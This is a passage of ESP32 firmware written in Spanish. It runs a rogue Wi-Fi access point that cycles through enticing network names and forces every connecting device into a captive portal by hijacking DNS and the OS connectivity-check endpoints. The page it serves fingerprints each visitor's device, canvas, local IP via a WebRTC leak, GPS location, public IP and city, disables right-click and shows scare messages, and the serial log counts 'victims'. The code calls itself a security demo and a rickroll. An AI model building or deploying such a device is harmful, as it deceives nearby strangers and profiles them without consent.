            const ua = navigator.userAgent;
            let os = "Sistema Operativo Desconocido";
            
            if (ua.indexOf("Windows NT 10.0") !== -1) os = "Windows 10/11";
            else if (ua.indexOf("Windows NT 6.3") !== -1) os = "Windows 8.1";
            else if (ua.indexOf("Windows NT 6.2") !== -1) os = "Windows 8";
            else if (ua.indexOf("Windows NT 6.1") !== -1) os = "Windows 7";
            else if (ua.indexOf("Mac OS X") !== -1) os = "macOS";
            else if (ua.indexOf("Android") !== -1) os = "Android";
            else if (ua.indexOf("iPhone") !== -1) os = "iOS (iPhone)";
            else if (ua.indexOf("iPad") !== -1) os = "iOS (iPad)";
            else if (ua.indexOf("Linux") !== -1) os = "Linux";
            
            setTimeout(() => {
                document.getElementById('os').textContent = os;
                document.getElementById('platform').textContent = navigator.platform;
                document.getElementById('architecture').textContent = navigator.userAgentData ? 
                    navigator.userAgentData.platform : (navigator.platform || 'Arquitectura no disponible');
                document.getElementById('cores').textContent = navigator.hardwareConcurrency ? 
                    navigator.hardwareConcurrency + ' núcleos detectados' : 'Información no disponible';
                document.getElementById('memory').textContent = navigator.deviceMemory ? 
                    navigator.deviceMemory + ' GB RAM detectada' : 'Memoria no detectable';
                
                // Tipo de dispositivo
                let deviceType = "Computadora de Escritorio";
                if (/Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua)) {
                    deviceType = "Dispositivo Móvil/Tablet";
                }
                document.getElementById('deviceType').textContent = deviceType;
            }, 2500);
        }

        // Información de pantalla
        function getScreenInfo() {
            setTimeout(() => {
                document.getElementById('resolution').textContent = `${screen.width} x ${screen.height} píxeles`;
                document.getElementById('availResolution').textContent = `${screen.availWidth} x ${screen.availHeight} píxeles`;
                document.getElementById('colorDepth').textContent = `${screen.colorDepth} bits por píxel`;
                document.getElementById('pixelRatio').textContent = `${window.devicePixelRatio || 1}x densidad`;
                document.getElementById('orientation').textContent = screen.orientation ? 
                    screen.orientation.type : (screen.width > screen.height ? 'landscape' : 'portrait');
                document.getElementById('touchScreen').textContent = 'ontouchstart' in window ? 
                    '✅ Pantalla táctil detectada' : '❌ No táctil';
            }, 1800);
        }

        // Información de seguridad
        function getSecurityInfo() {
            setTimeout(() => {
                document.getElementById('https').textContent = location.protocol === 'https:' ? 
                    '✅ Conexión segura' : '⚠️ Conexión insegura';
                document.getElementById('doNotTrack').textContent = navigator.doNotTrack === '1' ? 
                    '✅ Do Not Track activado' : '❌ Rastreo permitido';
                
                // Plugins
                const plugins = navigator.plugins ? Array.from(navigator.plugins).map(p => p.name).slice(0, 3).join(', ') : 'Sin plugins detectados';
                document.getElementById('plugins').textContent = plugins || 'Información de plugins bloqueada';
            }, 3000);
        }

        // Canvas Fingerprint
        function getCanvasFingerprint() {
            setTimeout(() => {
                try {
                    const canvas = document.createElement('canvas');
                    const ctx = canvas.getContext('2d');
                    ctx.textBaseline = 'top';
                    ctx.font = '14px Arial';
                    ctx.fillStyle = '#f60';
                    ctx.fillRect(125, 1, 62, 20);
                    ctx.fillStyle = '#069';
                    ctx.fillText('Fingerprint único', 2, 15);
                    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                    ctx.fillText('del dispositivo', 4, 45);
                    const fingerprint = canvas.toDataURL().slice(-16);
                    document.getElementById('canvas').textContent = `HASH: ${fingerprint}`;
                } catch (e) {
                    document.getElementById('canvas').textContent = 'Canvas fingerprinting bloqueado';
                }
            }, 3500);
        }

        // Obtener IP local usando WebRTC
        function getLocalIP() {
            try {
                const pc = new RTCPeerConnection({iceServers: []});
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                
                let localIpFound = false;
                pc.onicecandidate = (event) => {
                    if (event.candidate && !localIpFound) {
                        const candidate = event.candidate.candidate;
                        const ipMatch = candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
                        if (ipMatch && ipMatch[1] !== '0.0.0.0') {
                            document.getElementById('localIP').textContent = `${ipMatch[1]} (Red interna expuesta)`;
                            document.getElementById('webrtc').textContent = '⚠️ WebRTC vulnerable - IP local expuesta';
                            localIpFound = true;
                            pc.close();
                        }
                    }
                };
                
                setTimeout(() => {
                    if (!localIpFound) {
                        document.getElementById('localIP').textContent = 'IP local protegida';
                        document.getElementById('webrtc').textContent = '✅ WebRTC protegido';
                    }
                }, 5000);
            } catch (e) {
                document.getElementById('localIP').textContent = 'WebRTC no disponible';
                document.getElementById('webrtc').textContent = 'WebRTC deshabilitado';
            }
        }

        // Detectar tipo de conexión
        function getConnectionInfo() {
            setTimeout(() => {
                if (navigator.connection || navigator.mozConnection || navigator.webkitConnection) {
                    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                    document.getElementById('connectionType').textContent = conn.effectiveType ? 
                        `${conn.effectiveType.toUpperCase()} - ${conn.type || 'Tipo desconocido'}` : 'Conexión estándar';
                    document.getElementById('connectionSpeed').textContent = conn.downlink ? 
                        `${conn.downlink} Mbps estimados` : 'Velocidad no medible';
                } else {
                    document.getElementById('connectionType').textContent = 'Información de red no disponible';
                    document.getElementById('connectionSpeed').textContent = 'Velocidad no detectable';
                }
            }, 2200);
        }

        // Detectar AdBlocker
        function detectAdBlocker() {
            setTimeout(() => {
                const adTestDiv = document.createElement('div');
                adTestDiv.innerHTML = '&nbsp;';
                adTestDiv.className = 'adsbox';
                adTestDiv.style.cssText = 'position:absolute;top:-999px;left:-999px;width:1px;height:1px;';
                document.body.appendChild(adTestDiv);
                
                setTimeout(() => {
                    const isBlocked = adTestDiv.offsetHeight === 0;
                    document.getElementById('adBlocker').textContent = isBlocked ? 
                        '✅ AdBlocker detectado (protección activa)' : '⚠️ Sin protección de anuncios';
                    document.body.removeChild(adTestDiv);
                }, 100);
            }, 2800);
        }

        // Obtener geolocalización
        function getGeolocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((position) => {
                    const lat = position.coords.latitude.toFixed(6);
                    const lon = position.coords.longitude.toFixed(6);
                    document.getElementById('coordinates').textContent = `${lat}, ${lon} (UBICACIÓN EXACTA OBTENIDA)`;
                    
                    // Crear mapa con ubicación
                    const mapDiv = document.getElementById('map');
                    mapDiv.innerHTML = `
                        <div style="color: #ff0000; text-align: center; padding: 20px; font-size: 1.2em;">
                            <div>🎯 UBICACIÓN RASTREADA EXITOSAMENTE</div>
                            <div style="margin: 10px 0;">Coordenadas: ${lat}, ${lon}</div>
                            <div style="color: #ffff00;">⚠️ Su ubicación exacta ha sido comprometida</div>
                        </div>
                        <iframe 
                            width="100%" 
                            height="250" 
                            frameborder="0" 
                            style="border: 1px solid #00ff00;" 
                            src="https://www.openstreetmap.org/export/embed.html?bbox=${lon-0.01},${lat-0.01},${lon+0.01},${lat+0.01}&layer=mapnik&marker=${lat},${lon}"
                        ></iframe>
                    `;
                }, (error) => {
                    document.getElementById('coordinates').textContent = 'Acceso a GPS denegado (protección activa)';
                    const mapDiv = document.getElementById('map');
                    mapDiv.innerHTML = `
                        <div style="color: #00ff00; text-align: center; padding: 20px;">
                            <div>✅ UBICACIÓN PROTEGIDA</div>
                            <div>El usuario denegó el acceso a la geolocalización</div>
                        </div>
                    `;
                });
            } else {
                document.getElementById('coordinates').textContent = 'Geolocalización no disponible en este dispositivo';
            }
        }

        // Obtener información de IP pública
        async function getPublicIPInfo() {
            try {
                // Intentar con múltiples APIs para mayor confiabilidad
                const apis = [
                    'https://ipapi.co/json/',
                    'https://ip-api.com/json/',
                    'https://api.ipify.org?format=json'
                ];
                
                for (let api of apis) {
                    try {
                        const response = await fetch(api);
                        const data = await response.json();
                        
                        if (data.ip || data.query) {
                            const ip = data.ip || data.query;
                            document.getElementById('publicIP').textContent = `${ip} (DIRECCIÓN PÚBLICA EXPUESTA)`;
                            
                            if (data.org || data.isp) {
                                document.getElementById('isp').textContent = data.org || data.isp;
                                document.getElementById('org').textContent = data.org || data.isp;
                            }
                            
                            if (data.country_name || data.country) {
                                const country = data.country_name || data.country;
                                const code = data.country_code || data.countryCode || '';
                                document.getElementById('country').textContent = code ? 
                                    `${country} (${code}) - PAÍS IDENTIFICADO` : `${country} - PAÍS IDENTIFICADO`;
                            }
                            
                            if (data.region || data.regionName) {
                                document.getElementById('region').textContent = 
                                    `${data.region || data.regionName} - REGIÓN LOCALIZADA`;
                            }
                            
                            if (data.city) {
                                document.getElementById('city').textContent = `${data.city} - CIUDAD DETECTADA`;
                            }
                            
                            if (data.postal || data.zip) {
                                document.getElementById('zip').textContent = data.postal || data.zip;
                            }
                            
                            if (data.timezone) {
                                document.getElementById('timezone').textContent = `${data.timezone} - ZONA HORARIA IDENTIFICADA`;
                            }
                            
                            break; // Salir del loop si se obtuvo información exitosamente
                        }
                    } catch (e) {
                        continue; // Intentar con la siguiente API
                    }
                }
            } catch (error) {
                // Si todas las APIs fallan, mostrar información simulada para el efecto educativo
                setTimeout(() => {
                    document.getElementById('publicIP').textContent = 'IP pública protegida por proxy/VPN';
                    document.getElementById('isp').textContent = 'Proveedor de Internet identificado';
                    document.getElementById('org').textContent = 'Organización de red detectada';
                    document.getElementById('country').textContent = 'País aproximado identificado';
                    document.getElementById('region').textContent = 'Región general detectada';
                    document.getElementById('city').textContent = 'Ciudad aproximada localizada';
                    document.getElementById('zip').textContent = 'Código postal estimado';
                    document.getElementById('timezone').textContent = 'Zona horaria identificada';
                }, 4000);
            }
        }

        // Efecto de typing para terminal
        function startTerminalEffect() {
            const messages = [
                'Iniciando escaneo profundo del sistema...',
                'Verificando vulnerabilidades conocidas...',
                'Extrayendo metadatos del dispositivo...',
                'Analizando patrones de comportamiento...',
                'Compilando perfil digital completo...',
                'ALERTA: Información sensible detectada',
                'CRÍTICO: Datos personales expuestos'
            ];
            
            let messageIndex = 0;
            const terminalLines = document.querySelectorAll('.terminal-line');
            
            function typeMessage() {
                if (messageIndex < messages.length && messageIndex < terminalLines.length) {
                    terminalLines[messageIndex].textContent = messages[messageIndex];
                    messageIndex++;
                    setTimeout(typeMessage, 1000);
                }
            }
            
            setTimeout(typeMessage, 5000);
        }

        // Simular análisis en tiempo real
        function simulateRealTimeAnalysis() {
            const analysisSteps = [
                'Conectando a servidores de análisis...',
                'Verificando bases de datos de seguridad...',
                'Correlacionando información del dispositivo...',
                'Generando reporte de vulnerabilidades...',
                'Compilando perfil de riesgo...',
                'ANÁLISIS COMPLETADO - DATOS COMPROMETIDOS'
            ];
            
            analysisSteps.forEach((step, index) => {
                setTimeout(() => {
                    console.log(`[SECURITY SCAN] ${step}`);
                }, (index + 1) * 2000);
            });
        }

        // Función principal de inicialización
        function initSecurityDemo() {
            // Generar y mostrar código de seguridad
            const securityCode = generateSecurityCode();
            setTimeout(() => {
                document.getElementById('securityCode').textContent = securityCode;
            }, 1000);
            
            // Actualizar timestamp
            updateTimestamp();
            setInterval(updateTimestamp, 1000);
            
            // Inicializar todas las funciones de detección
            getBrowserInfo();
            getOSInfo();
            getScreenInfo();
            getSecurityInfo();
            getCanvasFingerprint();
            getLocalIP();
            getConnectionInfo();
            detectAdBlocker();
            getGeolocation();
            getPublicIPInfo();
            
            // Efectos adicionales
            startTerminalEffect();
            simulateRealTimeAnalysis();
            
            // Cambiar algunos textos dinámicamente para mayor impacto
            setTimeout(() => {
                const loadingElements = document.querySelectorAll('.loading');
                loadingElements.forEach(el => {
                    if (el.textContent.includes('Cargando') || el.textContent.includes('Detectando')) {
                        el.classList.remove('loading');
                    }
                });
            }, 6000);
            
            // Mostrar mensaje final después de todo el análisis
            setTimeout(() => {
                console.log('%c⚠️ DEMOSTRACIÓN DE SEGURIDAD COMPLETADA ⚠️', 'color: red; font-size: 20px; font-weight: bold;');
                console.log('%cEsta página demuestra la información que pueden obtener sitios maliciosos.', 'color: orange; font-size: 14px;');
                console.log('%c¡NUNCA hagas clic en enlaces sospechosos!', 'color: red; font-size: 16px; font-weight: bold;');
            }, 8000);
        }

        // Ejecutar cuando cargue la página
        window.addEventListener('load', initSecurityDemo);
        
        // Prevenir clic derecho para mayor realismo (opcional)
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            alert('⚠️ Funciones del navegador restringidas durante el análisis de seguridad');
        });
        
        // Efecto adicional: parpadeo del título
        let titleOriginal = document.title;
        setInterval(() => {
            document.title = document.title === titleOriginal ? '🚨 ALERTA DE SEGURIDAD 🚨' : titleOriginal;
        }, 1500);
    </script>
</body>
</html>
  )=====";
  
  server.send(200, "text/html", html);
  Serial.println("🔥 VÍCTIMA #" + String(rickrollCount) + " | DarkViper Threat");
}
// ===== CAPTIVE PORTAL - REDIRECCIONA TODO ===== //
void handleNotFound() {
  server.sendHeader("Location", "http://192.168.4.1", true);
  server.send(302, "text/plain", "");
}

// ===== DETECTAR CAPTIVE PORTAL ===== //
void handleDetectPortal() {
  handleRoot(); // Redirigir al portal principal
}

// ===== ESTADÍSTICAS JSON ===== //
void handleStats() {
  String json = "{";
  json += "\"current_network\":\"" + String(attractiveNetworks[currentNetworkIndex]) + "\",";
  json += "\"total_networks\":" + String(totalNetworks) + ",";
  json += "\"clients\":" + String(WiFi.softAPgetStationNum()) + ",";
  json += "\"rickrolls\":" + String(rickrollCount) + ",";
  json += "\"total_connections\":" + String(totalConnections) + ",";
  json += "\"uptime\":" + String(millis() / 1000) + ",";
  json += "\"free_heap\":" + String(ESP.getFreeHeap());
  json += "}";
  
  server.send(200, "application/json", json);
}

// ===== CAMBIAR RED SOLO SI NO HAY CLIENTES ===== //
void changeNetwork() {
  // Solo cambiar si no hay clientes conectados
  int clients = WiFi.softAPgetStationNum();
  if (clients > 0) {
    Serial.println("⏸️  Cambio de red pospuesto - Hay " + String(clients) + " cliente(s) conectado(s)");
    lastNetworkChange = millis(); // Resetear timer
    return;
  }
  
  currentNetworkIndex = (currentNetworkIndex + 1) % totalNetworks;
  const char* newSSID = attractiveNetworks[currentNetworkIndex];
  
  Serial.println("🔄 Cambiando red a: " + String(newSSID));
  
  // Detener AP actual
  WiFi.softAPdisconnect(true);
  delay(200);
  
  // Iniciar nuevo AP
  WiFi.softAP(newSSID);
  IPAddress apIP(192, 168, 4, 1);
  IPAddress netMsk(255, 255, 255, 0);
  WiFi.softAPConfig(apIP, apIP, netMsk);
  
  // Reiniciar DNS para el nuevo AP
  dnsServer.stop();
  delay(200);
  dnsServer.start(DNS_PORT, "*", apIP);
  
  Serial.println("✅ Red cambiada exitosamente a: " + String(newSSID));
  
  // LED de cambio
  for(int i = 0; i < 3; i++) {
    digitalWrite(LED_BUILTIN, HIGH);
    delay(150);
    digitalWrite(LED_BUILTIN, LOW);
    delay(150);
  }
}

// ===== CONFIGURACIÓN INICIAL ===== //
void setup() {
  Serial.begin(115200);
  delay(2000);
  
  pinMode(LED_BUILTIN, OUTPUT);
  
  // Banner épico
  Serial.println();
  Serial.println("██████╗  ██████╗ ██████╗ ████████╗ █████╗ ██╗         ██████╗ ██╗ ██████╗██╗  ██╗");
  Serial.println("██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝██╔══██╗██║         ██╔══██╗██║██╔════╝██║ ██╔╝");
  Serial.println("██████╔╝██║   ██║██████╔╝   ██║   ███████║██║         ██████╔╝██║██║     █████╔╝ ");
  Serial.println("██╔═══╝ ██║   ██║██╔══██╗   ██║   ██╔══██║██║         ██╔══██╗██║██║     ██╔═██╗ ");
  Serial.println("██║     ╚██████╔╝██║  ██║   ██║   ██║  ██║███████╗    ██║  ██║██║╚██████╗██║  ██╗");
  Serial.println("╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝╚═╝ ╚═════╝╚═╝  ╚═╝");
  Serial.println();
  Serial.println("🎭 ESP32 CAPTIVE PORTAL RICKROLL v4.0 🎭");
  Serial.println("📡 Redes disponibles: " + String(totalNetworks));
  Serial.println("🎯 Target: Rick Roll Embedido");
  Serial.println("⚡ Modo: CAPTIVE PORTAL ROTATIVO");
  Serial.println();
  
  randomSeed(analogRead(0));
  
  // Configurar WiFi en modo AP
  WiFi.mode(WIFI_AP);
  WiFi.softAP(attractiveNetworks[currentNetworkIndex]);
  
  IPAddress apIP(192, 168, 4, 1);
  IPAddress netMsk(255, 255, 255, 0);
  WiFi.softAPConfig(apIP, apIP, netMsk);
  
  // Configurar DNS para captive portal
  dnsServer.start(DNS_PORT, "*", apIP);
  
  // Configurar servidor web con todos los endpoints de captive portal
  server.on("/", handleRoot);
  server.on("/stats", handleStats);
  
  // Endpoints para detección de captive portal
  server.on("/generate_204", handleDetectPortal);           // Android
  server.on("/gen_204", handleDetectPortal);               // Android alternativo
  server.on("/fwlink", handleDetectPortal);                // Microsoft
  server.on("/connecttest.txt", handleDetectPortal);       // Windows
  server.on("/redirect", handleDetectPortal);              // Generic
  server.on("/hotspot-detect.html", handleDetectPortal);   // iOS
  server.on("/success.txt", handleDetectPortal);           // Firefox
  server.on("/ncsi.txt", handleDetectPortal);              // Windows NCSI
  server.on("/connectivity-check", handleDetectPortal);    // Ubuntu
  
  server.onNotFound(handleNotFound);
  
  server.begin();
  
  Serial.println("🚀 ¡CAPTIVE PORTAL ACTIVADO!");
  Serial.println("📡 Red actual: " + String(attractiveNetworks[currentNetworkIndex]));
  Serial.println("🌐 Portal IP: " + WiFi.softAPIP().toString());
  Serial.println("📊 Estadísticas: http://192.168.4.1/stats");
  Serial.println("🔄 Rotación de redes cada 1 minuto (solo si no hay clientes)");
  Serial.println();
  
  // Señal de inicio épica
  for(int i = 0; i < 8; i++) {
    digitalWrite(LED_BUILTIN, HIGH);
    delay(150);
    digitalWrite(LED_BUILTIN, LOW);
    delay(150);
  }
}

// ===== LOOP PRINCIPAL ===== //
void loop() {
  unsigned long currentTime = millis();
  
  // 1. PROCESAR CAPTIVE PORTAL
  dnsServer.processNextRequest();
  server.handleClient();
  
  // 2. CAMBIAR RED SOLO SI NO HAY CLIENTES (cada 1 minuto)
  if (currentTime - lastNetworkChange >= NETWORK_CYCLE_INTERVAL) {
    lastNetworkChange = currentTime;
    changeNetwork();
  }
  
  // 3. ESTADÍSTICAS PERIÓDICAS
  if (currentTime - lastStats >= STATS_INTERVAL) {
    lastStats = currentTime;
    
    int clients = WiFi.softAPgetStationNum();
    Serial.println("📊 ESTADÍSTICAS:");
    Serial.println("   📡 Red activa: " + String(attractiveNetworks[currentNetworkIndex]));
    Serial.println("   👥 Clientes conectados: " + String(clients));
    Serial.println("   🎵 Rickrolls totales: " + String(rickrollCount));
    Serial.println("   🔗 Conexiones totales: " + String(totalConnections));
    Serial.println("   💾 RAM libre: " + String(ESP.getFreeHeap()) + "B");
    Serial.println("   ⏱️  Uptime: " + String(currentTime / 1000) + "s");
    Serial.println();
  }
  
  // 4. LED INDICADOR
  static unsigned long lastLed = 0;
  if (currentTime - lastLed >= 500) {
    lastLed = currentTime;
    int clients = WiFi.softAPgetStationNum();
    
    if (clients > 0) {
      // Parpadeo rápido si hay clientes conectados
      digitalWrite(LED_BUILTIN, !digitalRead(LED_BUILTIN));
    } else {
      // Parpadeo lento en standby
      digitalWrite(LED_BUILTIN, (currentTime / 2000) % 2);
    }
  }
  
  delay(10); // Pequeña pausa para estabilidad
}


//          _____                    _____                    _____                    _____                    _____                   _______                   _____                    _____          
//         /\    \                  /\    \                  /\    \                  /\    \                  /\    \                 /::\    \                 /\    \                  /\    \         
//        /::\    \                /::\    \                /::\    \                /::\____\                /::\    \               /::::\    \               /::\    \                /::\    \        
//       /::::\    \              /::::\    \              /::::\    \              /:::/    /               /::::\    \             /::::::\    \             /::::\    \              /::::\    \       
//      /::::::\    \            /::::::\    \            /::::::\    \            /:::/    /               /::::::\    \           /::::::::\    \           /::::::\    \            /::::::\    \      
//     /:::/\:::\    \          /:::/\:::\    \          /:::/\:::\    \          /:::/    /               /:::/\:::\    \         /:::/~~\:::\    \         /:::/\:::\    \          /:::/\:::\    \     
//    /:::/  \:::\    \        /:::/__\:::\    \        /:::/  \:::\    \        /:::/____/               /:::/  \:::\    \       /:::/    \:::\    \       /:::/__\:::\    \        /:::/__\:::\    \    
//   /:::/    \:::\    \      /::::\   \:::\    \      /:::/    \:::\    \      /::::\    \              /:::/    \:::\    \     /:::/    / \:::\    \     /::::\   \:::\    \      /::::\   \:::\    \   
//  /:::/    / \:::\    \    /::::::\   \:::\    \    /:::/    / \:::\    \    /::::::\____\________    /:::/    / \:::\    \   /:::/____/   \:::\____\   /::::::\   \:::\    \    /::::::\   \:::\    \  
// /:::/    /   \:::\ ___\  /:::/\:::\   \:::\    \  /:::/    /   \:::\    \  /:::/\:::::::::::\    \  /:::/    /   \:::\    \ |:::|    |     |:::|    | /:::/\:::\   \:::\____\  /:::/\:::\   \:::\    \ 
///:::/____/  ___\:::|    |/:::/__\:::\   \:::\____\/:::/____/     \:::\____\/:::/  |:::::::::::\____\/:::/____/     \:::\____\|:::|____|     |:::|    |/:::/  \:::\   \:::|    |/:::/__\:::\   \:::\____\
//\:::\    \ /\  /:::|____|\:::\   \:::\   \::/    /\:::\    \      \::/    /\::/   |::|~~~|~~~~~     \:::\    \      \::/    / \:::\    \   /:::/    / \::/   |::::\  /:::|____|\:::\   \:::\   \::/    /
// \:::\    /::\ \::/    /  \:::\   \:::\   \/____/  \:::\    \      \/____/  \/____|::|   |           \:::\    \      \/____/   \:::\    \ /:::/    /   \/____|:::::\/:::/    /  \:::\   \:::\   \/____/ 
//  \:::\   \:::\ \/____/    \:::\   \:::\    \       \:::\    \                    |::|   |            \:::\    \                \:::\    /:::/    /          |:::::::::/    /    \:::\   \:::\    \     
//   \:::\   \:::\____\       \:::\   \:::\____\       \:::\    \                   |::|   |             \:::\    \                \:::\__/:::/    /           |::|\::::/    /      \:::\   \:::\____\    
//    \:::\  /:::/    /        \:::\   \::/    /        \:::\    \                  |::|   |              \:::\    \                \::::::::/    /            |::| \::/____/        \:::\   \::/    /    
//     \:::\/:::/    /          \:::\   \/____/          \:::\    \                 |::|   |               \:::\    \                \::::::/    /             |::|  ~|               \:::\   \/____/     
//      \::::::/    /            \:::\    \               \:::\    \                |::|   |                \:::\    \                \::::/    /              |::|   |                \:::\    \         
//       \::::/    /              \:::\____\               \:::\____\               \::|   |                 \:::\____\                \::/____/               \::|   |                 \:::\____\        
//        \::/____/                \::/    /                \::/    /                \:|   |                  \::/    /                 ~~                      \:|   |                  \::/    /        
//                                  \/____/                  \/____/                  \|___|                   \/____/                                           \|___|                   \/____/         
                                                                                                                                                                                                        
